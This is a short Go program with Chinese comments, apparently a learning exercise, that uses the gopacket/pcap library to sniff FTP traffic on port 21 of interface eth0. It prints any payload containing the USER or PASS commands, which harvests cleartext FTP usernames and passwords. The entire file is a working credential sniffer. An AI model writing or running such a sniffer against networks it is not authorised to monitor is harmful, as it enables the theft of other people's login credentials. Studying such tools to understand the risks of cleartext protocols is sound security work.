package main

import (
	"bytes"
	"fmt"
	"log"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

// 捕获ftp明文账密

var (
	iface    = "eth0"
	snaplen  = int32(1600) // 每帧捕获的数据量
	promisc  = false       // 是否开启混杂模式
	timeout  = pcap.BlockForever
	filter   = "tcp and port 21"
	devFound = false
)

func main() {
	devices, err := pcap.FindAllDevs() // 获取所有设备
	if err != nil {
		log.Panic(err)
	}

	// 网卡名验证
	for _, dev := range devices {
		fmt.Println(dev.Name)
		if dev.Name == iface {
			devFound = true
		}

	}

	if !devFound {
		log.Fatalln("没有找到指定的网卡")
	}

	// 创建pcap handle
	handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)

	if err != nil {
		log.Fatal(err)
	}

	defer handle.Close()

	// 使用过滤器
	if err := handle.SetBPFFilter(filter); err != nil {
		log.Fatal(err)
	}

	// 返回一个管道，handle.LinkTyoe 代表解码器
	source := gopacket.NewPacketSource(handle, handle.LinkType())

	for packet := range source.Packets() { // 没有数据从管道读取的时候  就会阻塞
		fmt.Println(packet)
		appLayer := packet.ApplicationLayer() // 提取应用层
		if appLayer == nil {
			continue
		}

		payload := appLayer.Payload()                // 获取payload
		if bytes.Contains(payload, []byte("USER")) { // 检测是否包含USER
			fmt.Println("user" + string(payload))
		}
		if bytes.Contains(payload, []byte("PASS")) { // 检测是否包含USER
			fmt.Println("pass" + string(payload))
		}
	}
}
